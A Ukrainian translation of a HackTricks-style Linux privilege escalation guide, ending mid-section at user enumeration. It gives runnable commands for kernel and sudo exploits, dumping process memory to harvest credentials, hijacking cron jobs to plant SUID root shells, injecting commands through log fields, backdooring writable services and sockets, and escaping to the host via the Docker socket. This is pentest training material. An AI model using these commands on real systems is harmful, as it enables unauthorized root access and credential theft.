# Linux Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## Інформація про систему

### Інформація про ОС

Почнемо збирати інформацію про запущену ОС
```bash
(cat /proc/version || uname -a ) 2>/dev/null
lsb_release -a 2>/dev/null # old, not by default on many systems
cat /etc/os-release 2>/dev/null # universal on modern systems
```
### Path

Якщо ви **маєте права на запис у будь-якій директорії в змінній `PATH`**, ви можете hijack деякі бібліотеки або бінарні файли:
```bash
echo $PATH
```
### Env info

Цікава інформація, паролі або API-ключі у змінних оточення?
```bash
(env || set) 2>/dev/null
```
### Kernel exploits

Перевірте версію ядра і чи є exploit, який можна використати для escalate privileges
```bash
cat /proc/version
uname -a
searchsploit "Linux Kernel"
```
Ви можете знайти хороший список вразливих kernel та деякі вже **compiled exploits** тут: [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits) and [exploitdb sploits](https://gitlab.com/exploit-database/exploitdb-bin-sploits).\
Інші сайти, де можна знайти деякі **compiled exploits**: [https://github.com/bwbwbwbw/linux-exploit-binaries](https://github.com/bwbwbwbw/linux-exploit-binaries), [https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack](https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack)

Щоб витягти всі вразливі версії kernel з того сайту, ви можете зробити:
```bash
curl https://raw.githubusercontent.com/lucyoa/kernel-exploits/master/README.md 2>/dev/null | grep "Kernels: " | cut -d ":" -f 2 | cut -d "<" -f 1 | tr -d "," | tr ' ' '\n' | grep -v "^\d\.\d$" | sort -u -r | tr '\n' ' '
```
Інструменти, які можуть допомогти знайти kernel exploits:

[linux-exploit-suggester.sh](https://github.com/mzet-/linux-exploit-suggester)\
[linux-exploit-suggester2.pl](https://github.com/jondonas/linux-exploit-suggester-2)\
[linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py) (виконати на victim, перевіряє лише exploits для kernel 2.x)

Завжди **шукайте версію kernel у Google**, можливо ваша версія kernel вказана в якомусь kernel exploit, і тоді ви будете впевнені, що цей exploit дійсний.

### CVE-2016-5195 (DirtyCow)

Linux Privilege Escalation - Linux Kernel <= 3.19.0-73.8
```bash
# make dirtycow stable
echo 0 > /proc/sys/vm/dirty_writeback_centisecs
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
https://github.com/evait-security/ClickNRoot/blob/master/1/exploit.c
```
### Sudo версія

На основі вразливих версій sudo, що з'являються в:
```bash
searchsploit sudo
```
За допомогою цього grep можна перевірити, чи вразлива версія sudo.
```bash
sudo -V | grep "Sudo ver" | grep "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.2[01234567]"
```
#### sudo < v1.28

Від @sickrov
```
sudo -u#-1 /bin/bash
```
### Dmesg signature verification failed

Перевірте **smasher2 box of HTB** як **приклад** того, як цю vuln можна експлуатувати
```bash
dmesg 2>/dev/null | grep "signature"
```
### Більш детальне перерахування системи
```bash
date 2>/dev/null #Date
(df -h || lsblk) #System stats
lscpu #CPU info
lpstat -a 2>/dev/null #Printers info
```
## Перелічте можливі засоби захисту

### AppArmor
```bash
if [ `which aa-status 2>/dev/null` ]; then
aa-status
elif [ `which apparmor_status 2>/dev/null` ]; then
apparmor_status
elif [ `ls -d /etc/apparmor* 2>/dev/null` ]; then
ls -d /etc/apparmor*
else
echo "Not found AppArmor"
fi
```
### Grsecurity
```bash
((uname -r | grep "\-grsec" >/dev/null 2>&1 || grep "grsecurity" /etc/sysctl.conf >/dev/null 2>&1) && echo "Yes" || echo "Not found grsecurity")
```
### PaX
```bash
(which paxctl-ng paxctl >/dev/null 2>&1 && echo "Yes" || echo "Not found PaX")
```
### Execshield
```bash
(grep "exec-shield" /etc/sysctl.conf || echo "Not found Execshield")
```
### SElinux
```bash
(sestatus 2>/dev/null || echo "Not found sestatus")
```
### ASLR
```bash
cat /proc/sys/kernel/randomize_va_space 2>/dev/null
#If 0, not enabled
```
## Docker Breakout

Якщо ви перебуваєте всередині docker container, ви можете спробувати вирватися з нього:

{{#ref}}
docker-security/
{{#endref}}

## Диски

Перевірте **що змонтовано і що не змонтовано**, де і чому. Якщо щось не змонтовано, ви можете спробувати змонтувати його і перевірити на наявність конфіденційної інформації.
```bash
ls /dev 2>/dev/null | grep -i "sd"
cat /etc/fstab 2>/dev/null | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null
#Check if credentials in fstab
grep -E "(user|username|login|pass|password|pw|credentials)[=:]" /etc/fstab /etc/mtab 2>/dev/null
```
## Корисне програмне забезпечення

Перелічте корисні бінарні файли
```bash
which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null
```
Також перевірте, чи встановлено **any compiler**. Це корисно, якщо вам потрібно використовувати якийсь kernel exploit, оскільки рекомендується компілювати його на машині, де ви збираєтеся його використовувати (або на подібній).
```bash
(dpkg --list 2>/dev/null | grep "compiler" | grep -v "decompiler\|lib" 2>/dev/null || yum list installed 'gcc*' 2>/dev/null | grep gcc 2>/dev/null; which gcc g++ 2>/dev/null || locate -r "/gcc[0-9\.-]\+$" 2>/dev/null | grep -v "/doc/")
```
### Встановлене вразливе програмне забезпечення

Перевірте **версію встановлених пакетів і сервісів**. Можливо, є стара версія Nagios (наприклад), яку можна використати для підвищення привілеїв…\
Рекомендується вручну перевіряти версії найбільш підозрілого встановленого програмного забезпечення.
```bash
dpkg -l #Debian
rpm -qa #Centos
```
Якщо у вас є SSH доступ до машини, ви також можете використати **openVAS** для перевірки застарілого та вразливого програмного забезпечення, встановленого на машині.

> [!NOTE] > _Зверніть увагу, що ці команди покажуть багато інформації, яка здебільшого буде марною, тому рекомендується використовувати програми на кшталт OpenVAS або подібні, які перевіряють, чи версія встановленого програмного забезпечення вразлива до відомих exploits_

## Processes

Погляньте, **які процеси** виконуються, і перевірте, чи якийсь процес має **більше привілеїв, ніж повинен** (можливо tomcat запускається від root?)
```bash
ps aux
ps -ef
top -n 1
```
Завжди перевіряйте наявність можливих [**electron/cef/chromium debuggers** running, you could abuse it to escalate privileges](electron-cef-chromium-debugger-abuse.md). **Linpeas** виявляє їх, перевіряючи параметр `--inspect` у командному рядку процесу.\
Також **check your privileges over the processes binaries**, можливо, ви зможете overwrite їх.

### Process monitoring

Ви можете використовувати інструменти на кшталт [**pspy**](https://github.com/DominicBreuker/pspy) для моніторингу процесів. Це може бути дуже корисно для виявлення вразливих процесів, які виконуються часто або коли виконуються певні умови.

### Process memory

Деякі сервіси сервера зберігають **credentials in clear text inside the memory**.\
Зазвичай вам потрібні **root privileges** для читання пам'яті процесів, що належать іншим користувачам, тому це зазвичай корисніше, коли ви вже root і хочете знайти більше credentials.\
Проте пам'ятайте, що **as a regular user you can read the memory of the processes you own**.

> [!WARNING]
> Note that nowadays most machines **don't allow ptrace by default** which means that you cannot dump other processes that belong to your unprivileged user.
>
> The file _**/proc/sys/kernel/yama/ptrace_scope**_ controls the accessibility of ptrace:
>
> - **kernel.yama.ptrace_scope = 0**: усі процеси можуть бути відлагоджені, якщо вони мають той самий uid. Це класичний спосіб роботи ptrace.
> - **kernel.yama.ptrace_scope = 1**: only a parent process can be debugged.
> - **kernel.yama.ptrace_scope = 2**: Only admin can use ptrace, as it required CAP_SYS_PTRACE capability.
> - **kernel.yama.ptrace_scope = 3**: No processes may be traced with ptrace. Once set, a reboot is needed to enable ptracing again.

#### GDB

Якщо ви маєте доступ до пам'яті сервісу FTP (наприклад), ви можете отримати Heap і шукати всередині його credentials.
```bash
gdb -p <FTP_PROCESS_PID>
(gdb) info proc mappings
(gdb) q
(gdb) dump memory /tmp/mem_ftp <START_HEAD> <END_HEAD>
(gdb) q
strings /tmp/mem_ftp #User and password
```
#### Скрипт GDB
```bash:dump-memory.sh
#!/bin/bash
#./dump-memory.sh <PID>
grep rw-p /proc/$1/maps \
| sed -n 's/^\([0-9a-f]*\)-\([0-9a-f]*\) .*$/\1 \2/p' \
| while read start stop; do \
gdb --batch --pid $1 -ex \
"dump memory $1-$start-$stop.dump 0x$start 0x$stop"; \
done
```
#### /proc/$pid/maps & /proc/$pid/mem

Для заданого ідентифікатора процесу файли maps показують, як пам'ять відображена у віртуальному адресному просторі цього процесу; вони також показують права доступу кожного відображеного регіону. Псевдофайл mem надає доступ до самої пам'яті процесу. З файлу maps ми дізнаємося, які області пам'яті доступні для читання та їхні зсуви. Ми використовуємо цю інформацію, щоб виконати seek у файлі mem і dump усі доступні для читання області в файл.
```bash
procdump()
(
cat /proc/$1/maps | grep -Fv ".so" | grep " 0 " | awk '{print $1}' | ( IFS="-"
while read a b; do
dd if=/proc/$1/mem bs=$( getconf PAGESIZE ) iflag=skip_bytes,count_bytes \
skip=$(( 0x$a )) count=$(( 0x$b - 0x$a )) of="$1_mem_$a.bin"
done )
cat $1*.bin > $1.dump
rm $1*.bin
)
```
#### /dev/mem

`/dev/mem` надає доступ до **фізичної** пам'яті системи, а не до віртуальної пам'яті. Віртуальний простір адрес ядра можна отримати через /dev/kmem.\
Зазвичай `/dev/mem` доступний для читання лише для **root** та групи **kmem**.
```
strings /dev/mem -n10 | grep -i PASS
```
### ProcDump для linux

ProcDump — це переосмислена для Linux версія класичного інструменту ProcDump із набору Sysinternals для Windows. Отримати можна за адресою [https://github.com/Sysinternals/ProcDump-for-Linux](https://github.com/Sysinternals/ProcDump-for-Linux)
```
procdump -p 1714

ProcDump v1.2 - Sysinternals process dump utility
Copyright (C) 2020 Microsoft Corporation. All rights reserved. Licensed under the MIT license.
Mark Russinovich, Mario Hewardt, John Salem, Javid Habibi
Monitors a process and writes a dump file when the process meets the
specified criteria.

Process:		sleep (1714)
CPU Threshold:		n/a
Commit Threshold:	n/a
Thread Threshold:		n/a
File descriptor Threshold:		n/a
Signal:		n/a
Polling interval (ms):	1000
Threshold (s):	10
Number of Dumps:	1
Output directory for core dumps:	.

Press Ctrl-C to end monitoring without terminating the process.

[20:20:58 - WARN]: Procdump not running with elevated credentials. If your uid does not match the uid of the target process procdump will not be able to capture memory dumps
[20:20:58 - INFO]: Timed:
[20:21:00 - INFO]: Core dump 0 generated: ./sleep_time_2021-11-03_20:20:58.1714
```
### Інструменти

Щоб дампнути пам'ять процесу, ви можете використати:

- [**https://github.com/Sysinternals/ProcDump-for-Linux**](https://github.com/Sysinternals/ProcDump-for-Linux)
- [**https://github.com/hajzer/bash-memory-dump**](https://github.com/hajzer/bash-memory-dump) (root) - \_Ви можете вручну прибрати вимогу root та зробити дамп процесу, який належить вам
- Script A.5 from [**https://www.delaat.net/rp/2016-2017/p97/report.pdf**](https://www.delaat.net/rp/2016-2017/p97/report.pdf) (потрібен root)

### Облікові дані з пам'яті процесу

#### Ручний приклад

Якщо ви виявите, що процес authenticator запущено:
```bash
ps -ef | grep "authenticator"
root      2027  2025  0 11:46 ?        00:00:00 authenticator
```
Ви можете dump the process (див. попередні розділи, щоб знайти різні способи dump the memory of a process) і шукати credentials всередині memory:
```bash
./dump-memory.sh 2027
strings *.dump | grep -i password
```
#### mimipenguin

The tool [**https://github.com/huntergregal/mimipenguin**](https://github.com/huntergregal/mimipenguin) will **викрадати облікові дані у відкритому вигляді з пам'яті** and from some **well known files**. It requires root privileges to work properly.

| Функція                                           | Назва процесу         |
| ------------------------------------------------- | -------------------- |
| Пароль GDM (Kali Desktop, Debian Desktop)         | gdm-password         |
| Gnome Keyring (Ubuntu Desktop, ArchLinux Desktop) | gnome-keyring-daemon |
| LightDM (Ubuntu Desktop)                          | lightdm              |
| VSFTPd (Активні FTP-з'єднання)                   | vsftpd               |
| Apache2 (Активні HTTP Basic Auth Sessions)         | apache2              |
| OpenSSH (Активні SSH Sessions - Sudo Usage)        | sshd:                |

#### Пошук регулярних виразів/[truffleproc](https://github.com/controlplaneio/truffleproc)
```bash
# un truffleproc.sh against your current Bash shell (e.g. $$)
./truffleproc.sh $$
# coredumping pid 6174
Reading symbols from od...
Reading symbols from /usr/lib/systemd/systemd...
Reading symbols from /lib/systemd/libsystemd-shared-247.so...
Reading symbols from /lib/x86_64-linux-gnu/librt.so.1...
[...]
# extracting strings to /tmp/tmp.o6HV0Pl3fe
# finding secrets
# results in /tmp/tmp.o6HV0Pl3fe/results.txt
```
## Планові/Cron завдання

### Crontab UI (alseambusher), запущений від імені root — веб-інтерфейсний планувальник для privesc

Якщо веб‑панель “Crontab UI” (alseambusher/crontab-ui) запущена від імені root і прив'язана лише до loopback, ви все одно можете дістатися до неї через SSH local port-forwarding і створити привілейоване завдання для privesc.

Типовий ланцюжок
- Виявити порт, доступний лише на loopback (наприклад, 127.0.0.1:8000) та Basic-Auth realm за допомогою `ss -ntlp` / `curl -v localhost:8000`
- Знайти облікові дані в операційних артефактах:
- Резервні копії/скрипти з `zip -P <password>`
- systemd unit, який містить `Environment="BASIC_AUTH_USER=..."`, `Environment="BASIC_AUTH_PWD=..."`
- Створити тунель і увійти:
```bash
ssh -L 9001:localhost:8000 user@target
# browse http://localhost:9001 and authenticate
```
- Створити high-priv job і запустити негайно (drops SUID shell):
```bash
# Name: escalate
# Command:
cp /bin/bash /tmp/rootshell && chmod 6777 /tmp/rootshell
```
- Використовуйте це:
```bash
/tmp/rootshell -p   # root shell
```
Підвищення безпеки
- Не запускайте Crontab UI як root; обмежте його виконання виділеним користувачем із мінімальними правами
- Прив'язуйте до localhost та додатково обмежуйте доступ через firewall/VPN; не використовуйте паролі повторно
- Уникайте вбудовування секретів у unit files; використовуйте сховища секретів або root-only EnvironmentFile
- Увімкніть аудит/логування для on-demand job executions

Перевірте, чи якась scheduled job уразлива. Можливо, ви зможете скористатися скриптом, що виконується від імені root (wildcard vuln? чи можна змінити файли, які використовує root? use symlinks? створити певні файли в директорії, яку використовує root?).
```bash
crontab -l
ls -al /etc/cron* /etc/at*
cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"
```
### Cron path

Наприклад, всередині _/etc/crontab_ ви можете знайти PATH: _PATH=**/home/user**:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin_

(_Зверніть увагу, що користувач "user" має права запису в /home/user_)

Якщо всередині цього crontab користувач root намагається виконати команду або скрипт без встановлення PATH. Наприклад: _\* \* \* \* root overwrite.sh_\

Тоді ви можете отримати root shell, використавши:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
#Wait cron job to be executed
/tmp/bash -p #The effective uid and gid to be set to the real uid and gid
```
### Cron using a script with a wildcard (Wildcard Injection)

Якщо скрипт, який виконується під root, має “**\***” у команді, ви можете використати це, щоб зробити несподівані речі (наприклад privesc). Приклад:
```bash
rsync -a *.sh rsync://host.back/src/rbd #You can create a file called "-e sh myscript.sh" so the script will execute our script
```
**Якщо wildcard розташований після шляху, наприклад** _**/some/path/\***_ **, він не є вразливим (навіть** _**./\***_ **не є вразливим).**

Прочитайте наступну сторінку для додаткових трюків експлуатації wildcard:


{{#ref}}
wildcards-spare-tricks.md
{{#endref}}


### Bash arithmetic expansion injection in cron log parsers

Bash виконує parameter expansion та command substitution перед arithmetic evaluation в ((...)), $((...)) та let. Якщо root cron/parser читає untrusted log fields і підставляє їх в arithmetic context, атакуючий може інжектити command substitution $(...), яке виконається як root під час запуску cron.

- Why it works: In Bash, expansions occur in this order: parameter/variable expansion, command substitution, arithmetic expansion, then word splitting and pathname expansion. So a value like `$(/bin/bash -c 'id > /tmp/pwn')0` is first substituted (running the command), then the remaining numeric `0` is used for the arithmetic so the script continues without errors.

- Typical vulnerable pattern:
```bash
#!/bin/bash
# Example: parse a log and "sum" a count field coming from the log
while IFS=',' read -r ts user count rest; do
# count is untrusted if the log is attacker-controlled
(( total += count ))     # or: let "n=$count"
done < /var/www/app/log/application.log
```

- Exploitation: Get attacker-controlled text written into the parsed log so that the numeric-looking field contains a command substitution and ends with a digit. Ensure your command does not print to stdout (or redirect it) so the arithmetic remains valid.
```bash
# Injected field value inside the log (e.g., via a crafted HTTP request that the app logs verbatim):
$(/bin/bash -c 'cp /bin/bash /tmp/sh; chmod +s /tmp/sh')0
# When the root cron parser evaluates (( total += count )), your command runs as root.
```

### Cron script overwriting and symlink

If you **can modify a cron script** executed by root, you can get a shell very easily:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > </PATH/CRON/SCRIPT>
#Wait until it is executed
/tmp/bash -p
```
Якщо скрипт, який виконується від імені root, використовує **каталог, у якому у вас повний доступ**, можливо, буде корисно видалити цю папку і **створити symlink-папку, що вказує на інший каталог**, яка подаватиме скрипт, контрольований вами
```bash
ln -d -s </PATH/TO/POINT> </PATH/CREATE/FOLDER>
```
### Часті cron jobs

Ви можете моніторити процеси, щоб шукати процеси, які виконуються кожні 1, 2 або 5 хвилин. Можливо, ви зможете скористатися цим і escalate privileges.

Наприклад, щоб **моніторити кожні 0.1s протягом 1 хвилини**, **відсортувати за найменшою кількістю виконань команд** і видалити команди, які були виконані найчастіше, ви можете зробити так:
```bash
for i in $(seq 1 610); do ps -e --format cmd >> /tmp/monprocs.tmp; sleep 0.1; done; sort /tmp/monprocs.tmp | uniq -c | grep -v "\[" | sed '/^.\{200\}./d' | sort | grep -E -v "\s*[6-9][0-9][0-9]|\s*[0-9][0-9][0-9][0-9]"; rm /tmp/monprocs.tmp;
```
**Ви також можете використовувати** [**pspy**](https://github.com/DominicBreuker/pspy/releases) (воно моніторитиме та перелічуватиме кожен процес, що запускається).

### Невидимі cron jobs

Можна створити cronjob, **додавши символ повернення каретки після коментаря** (без символу нового рядка), і cron job працюватиме. Приклад (зверніть увагу на символ повернення каретки):
```bash
#This is a comment inside a cron config file\r* * * * * echo "Surprise!"
```
## Сервіси

### Файли _.service_, доступні для запису

Перевірте, чи можете ви записувати будь-який `.service` файл; якщо так, ви **можете модифікувати його**, щоб він **виконував** ваш backdoor при **запуску**, **перезапуску** або **зупинці** service (можливо, доведеться почекати, поки машина буде rebooted).\
Наприклад, розмістіть ваш backdoor всередині `.service` файлу з **`ExecStart=/tmp/script.sh`**

### Бінарні файли сервісів, доступні для запису

Майте на увазі, що якщо у вас є **write permissions over binaries being executed by services**, ви можете змінити їх на backdoors, тож коли services будуть повторно виконані, backdoors будуть виконані.

### systemd PATH - Relative Paths

Ви можете побачити PATH, який використовує **systemd**, за допомогою:
```bash
systemctl show-environment
```
Якщо ви виявите, що можете **write** в будь-якій із папок цього шляху, ви можете отримати можливість **escalate privileges**. Вам потрібно шукати **relative paths being used on service configurations** у файлах, таких як:
```bash
ExecStart=faraday-server
ExecStart=/bin/sh -ec 'ifup --allow=hotplug %I; ifquery --state %I'
ExecStop=/bin/sh "uptux-vuln-bin3 -stuff -hello"
```
Потім створіть **виконуваний файл** з **тим самим ім'ям, що й бінарний файл за відносним шляхом** у папці PATH systemd, у яку ви маєте права запису, і коли службі буде доручено виконати вразливу дію (**Start**, **Stop**, **Reload**), ваш **бекдор буде виконано** (непривілейовані користувачі зазвичай не можуть запускати/зупиняти служби, але перевірте, чи можете ви використати `sudo -l`).

**Дізнайтесь більше про служби за допомогою `man systemd.service`.**

## **Timers**

**Timers** — це unit-файли systemd, назви яких закінчуються на `**.timer**`, які контролюють `**.service**` файли або події. **Timers** можна використовувати як альтернативу cron, оскільки вони мають вбудовану підтримку подій календарного часу та монотонних часових подій і можуть виконуватись асинхронно.

Ви можете перерахувати всі таймери за допомогою:
```bash
systemctl list-timers --all
```
### Записувані таймери

Якщо ви можете змінити таймер, ви можете змусити його виконати деякі існуючі одиниці systemd.unit (наприклад, `.service` або `.target`)
```bash
Unit=backdoor.service
```
У документації можна прочитати, що таке Unit:

> Юніт, який потрібно активувати, коли цей таймер спливає. Аргумент — це ім'я юніта, суфікс якого не є ".timer". Якщо не вказано, це значення за замовчуванням відповідає сервісу, який має те саме ім'я, що й таймер, за винятком суфіксу. (Див. вище.) Рекомендується, щоб ім'я юніта, що активується, і ім'я таймер-юніта були ідентичні, за винятком суфіксу.

Тому, щоб зловживати цим дозволом, потрібно:

- Знайти якийсь systemd unit (наприклад, `.service`), який **виконує бінарний файл, доступний для запису**
- Знайти якийсь systemd unit, який **запускає виконуваний файл за відносним шляхом** і над яким у вас є **привілеї запису** у **systemd PATH** (щоб підмінити цей виконуваний файл)

**Дізнайтеся більше про таймери за допомогою `man systemd.timer`.**

### **Включення таймера**

Щоб увімкнути таймер, потрібні права root і потрібно виконати:
```bash
sudo systemctl enable backu2.timer
Created symlink /etc/systemd/system/multi-user.target.wants/backu2.timer → /lib/systemd/system/backu2.timer.
```
Note the **timer** is **activated** by creating a symlink to it on `/etc/systemd/system/<WantedBy_section>.wants/<name>.timer`

## Сокети

Unix Domain Sockets (UDS) дозволяють **взаємодію процесів** на тій самій або різних машинах у моделях клієнт‑сервер. Вони використовують стандартні Unix descriptor файли для міжкомп’ютерного зв’язку і налаштовуються через файли `.socket`.

Сокети можуть бути налаштовані за допомогою файлів `.socket`.

**Детальніше про sockets дивіться в `man systemd.socket`.** У цьому файлі можна налаштувати кілька цікавих параметрів:

- `ListenStream`, `ListenDatagram`, `ListenSequentialPacket`, `ListenFIFO`, `ListenSpecial`, `ListenNetlink`, `ListenMessageQueue`, `ListenUSBFunction`: Ці опції відрізняються, але узагальнено використовуються для **вказівки, де буде здійснюватися прослуховування** сокета (шлях до файлу AF_UNIX socket, IPv4/6 та/або номер порту для прослуховування тощо).
- `Accept`: Приймає булевий аргумент. Якщо **true**, для кожного вхідного з'єднання створюється окремий екземпляр сервісу, і йому передається лише сокет цього з'єднання. Якщо **false**, усі прослуховуючі сокети передаються до одного запущеного сервіс‑юниту, і для всіх з'єднань створюється лише один сервіс‑юнит. Це значення ігнорується для datagram сокетів і FIFO, де один сервіс‑юнит безумовно обробляє весь вхідний трафік. **За замовчуванням — false**. З міркувань продуктивності рекомендується писати нові демони так, щоб вони були сумісні з `Accept=no`.
- `ExecStartPre`, `ExecStartPost`: Приймають одну або декілька командних рядків, які **виконуються до** або **після** створення та прив'язки прослуховуючих **сокетів**/FIFO, відповідно. Першим токеном командного рядка має бути абсолютне ім'я файлу, після якого йдуть аргументи процесу.
- `ExecStopPre`, `ExecStopPost`: Додаткові **команди**, які **виконуються до** або **після** закриття та видалення прослуховуючих **сокетів**/FIFO, відповідно.
- `Service`: Вказує ім'я сервіс‑юниту, **який активується** при **вхідному трафіку**. Ця опція дозволена тільки для сокетів з Accept=no. За замовчуванням використовується сервіс з таким самим ім'ям, як і сокет (з відповідною заміною суфікса). У більшості випадків використання цієї опції не є необхідним.

### Файли .socket з правом запису

Якщо ви знайдете **файл `.socket`, доступний для запису**, ви можете **додати** на початку секції `[Socket]` щось на кшталт: `ExecStartPre=/home/kali/sys/backdoor`, і backdoor буде виконано перед створенням сокета. Тому вам **ймовірно доведеться почекати до перезавантаження машини.**\
_Зверніть увагу, що система має використовувати цю конфігурацію файлу `.socket`, інакше backdoor не буде виконано._

### Сокети, доступні для запису

Якщо ви **виявите будь‑який сокет, доступний для запису** (_тут мова про Unix Sockets, а не про конфігураційні файли `.socket`_), то **ви можете спілкуватися** з цим сокетом і, можливо, експлуатувати вразливість.

### Перелічення Unix сокетів
```bash
netstat -a -p --unix
```
### Сире з'єднання
```bash
#apt-get install netcat-openbsd
nc -U /tmp/socket  #Connect to UNIX-domain stream socket
nc -uU /tmp/socket #Connect to UNIX-domain datagram socket

#apt-get install socat
socat - UNIX-CLIENT:/dev/socket #connect to UNIX-domain socket, irrespective of its type
```
**Приклад експлуатації:**


{{#ref}}
socket-command-injection.md
{{#endref}}

### HTTP сокети

Зауважте, що можуть бути деякі **сокети, що слухають HTTP** запити (_я не говорю про .socket файли, а про файли, що виступають у ролі unix sockets_). Ви можете перевірити це за допомогою:
```bash
curl --max-time 2 --unix-socket /pat/to/socket/files http:/index
```
Якщо сокет **відповідає на HTTP-запит**, то ви можете з ним **спілкуватися** і, можливо, **експлуатувати якусь вразливість**.

### Docker сокет з правами на запис

The Docker socket, often found at `/var/run/docker.sock`, є критичним файлом, який потрібно захистити. За замовчуванням він доступний для запису користувачу `root` та членам групи `docker`. Маючи доступ на запис до цього сокету, ви можете досягти privilege escalation. Нижче — розбивка того, як це можна зробити, та альтернативні методи, якщо Docker CLI недоступний.

#### **Privilege Escalation with Docker CLI**

Якщо ви маєте доступ на запис до Docker сокету, ви можете escalate privileges, використовуючи наступні команди:
```bash
docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash
docker -H unix:///var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
```
Ці команди дозволяють запустити контейнер з root-доступом до файлової системи хоста.

#### **Використання Docker API безпосередньо**

У випадках, коли Docker CLI недоступний, docker socket все ще можна використовувати через Docker API та команди `curl`.

1.  **List Docker Images:** Отримати список доступних images.

```bash
curl -XGET --unix-socket /var/run/docker.sock http://localhost/images/json
```

2.  **Create a Container:** Надішліть запит на створення контейнера, який монтує кореневий каталог хоста.

```bash
curl -XPOST -H "Content-Type: application/json" --unix-socket /var/run/docker.sock -d '{"Image":"<ImageID>","Cmd":["/bin/sh"],"DetachKeys":"Ctrl-p,Ctrl-q","OpenStdin":true,"Mounts":[{"Type":"bind","Source":"/","Target":"/host_root"}]}' http://localhost/containers/create
```

Запустіть щойно створений контейнер:

```bash
curl -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/<NewContainerID>/start
```

3.  **Attach to the Container:** Використайте `socat` для встановлення з'єднання з контейнером, що дозволить виконувати команди всередині нього.

```bash
socat - UNIX-CONNECT:/var/run/docker.sock
POST /containers/<NewContainerID>/attach?stream=1&stdin=1&stdout=1&stderr=1 HTTP/1.1
Host:
Connection: Upgrade
Upgrade: tcp
```

Після налаштування з'єднання через `socat` ви зможете виконувати команди безпосередньо в контейнері з root-доступом до файлової системи хоста.

### Інше

Зверніть увагу, що якщо у вас є права на запис у docker socket через те, що ви **входите до групи `docker`**, у вас є [**більше способів ескалації привілеїв**](interesting-groups-linux-pe/index.html#docker-group). Якщо [**docker API слухає порт** ви також можете бути в змозі скомпрометувати його](../../network-services-pentesting/2375-pentesting-docker.md#compromising).

Перевірте **більше способів вийти з docker або зловживати ним для ескалації привілеїв** в:


{{#ref}}
docker-security/
{{#endref}}

## Containerd (ctr) підвищення привілеїв

Якщо ви виявите, що можете використовувати команду **`ctr`**, прочитайте наступну сторінку, оскільки **ви можете зловживати нею для ескалації привілеїв**:


{{#ref}}
containerd-ctr-privilege-escalation.md
{{#endref}}

## **RunC** підвищення привілеїв

Якщо ви виявите, що можете використовувати команду **`runc`**, прочитайте наступну сторінку, оскільки **ви можете зловживати нею для ескалації привілеїв**:


{{#ref}}
runc-privilege-escalation.md
{{#endref}}

## **D-Bus**

D-Bus — це складна система міжпроцесної взаємодії (inter-Process Communication (IPC) system), яка дозволяє застосункам ефективно взаємодіяти та обмінюватися даними. Розроблена для сучасних Linux-систем, вона пропонує надійну структуру для різних форм комунікації між застосунками.

Система є універсальною, підтримуючи базові IPC-механізми, що покращують обмін даними між процесами, нагадуючи розширені UNIX domain sockets. Крім того, вона допомагає транслювати події або сигнали, сприяючи безшовній інтеграції між компонентами системи. Наприклад, сигнал від демона Bluetooth про вхідний дзвінок може змусити музичний плеєр приглушити звук, покращуючи користувацький досвід. Додатково, D-Bus підтримує систему віддалених об'єктів, спрощуючи запити сервісів і виклики методів між застосунками, що робить складні процеси простішими.

D-Bus працює за моделлю **allow/deny**, керуючи дозволами на повідомлення (виклики методів, емісії сигналів тощо) на основі кумулятивного ефекту правил політики, що збігаються. Ці політики визначають взаємодії з шиною, що потенційно може призвести до ескалації привілеїв через експлуатацію цих дозволів.

Приклад такої політики в `/etc/dbus-1/system.d/wpa_supplicant.conf` наведено нижче, що детально описує дозволи для користувача root володіти, надсилати та отримувати повідомлення від `fi.w1.wpa_supplicant1`.

Політики без вказаного користувача або групи застосовуються універсально, тоді як політики в контексті "default" застосовуються до всіх, хто не покритий іншими специфічними політиками.
```xml
<policy user="root">
<allow own="fi.w1.wpa_supplicant1"/>
<allow send_destination="fi.w1.wpa_supplicant1"/>
<allow send_interface="fi.w1.wpa_supplicant1"/>
<allow receive_sender="fi.w1.wpa_supplicant1" receive_type="signal"/>
</policy>
```
**Дізнайтеся, як enumerate та exploit D-Bus communication тут:**


{{#ref}}
d-bus-enumeration-and-command-injection-privilege-escalation.md
{{#endref}}

## **Мережа**

Завжди цікаво виконати enumerate мережі та визначити, де знаходиться машина.

### Загальна enumeration
```bash
#Hostname, hosts and DNS
cat /etc/hostname /etc/hosts /etc/resolv.conf
dnsdomainname

#Content of /etc/inetd.conf & /etc/xinetd.conf
cat /etc/inetd.conf /etc/xinetd.conf

#Interfaces
cat /etc/networks
(ifconfig || ip a)

#Neighbours
(arp -e || arp -a)
(route || ip n)

#Iptables rules
(timeout 1 iptables -L 2>/dev/null; cat /etc/iptables/* | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null)

#Files used by network services
lsof -i
```
### Відкриті порти

Завжди перевіряйте мережеві сервіси, що працюють на машині, з якими ви не могли взаємодіяти до отримання доступу:
```bash
(netstat -punta || ss --ntpu)
(netstat -punta || ss --ntpu) | grep "127.0"
```
### Sniffing

Перевірте, чи можете sniff traffic. Якщо так, ви зможете отримати деякі credentials.
```
timeout 1 tcpdump
```
## Користувачі

### Загальна енумерація

Перевірте, хто ви, які у вас **привілеї**, які **користувачі** є в системі, хто може **login** і хто має **root привілеї**:
```bash
#Info about me
id || (whoami && groups) 2>/dev/null
#List all users
cat /etc/passwd | cut -d: -f1
#List users with console
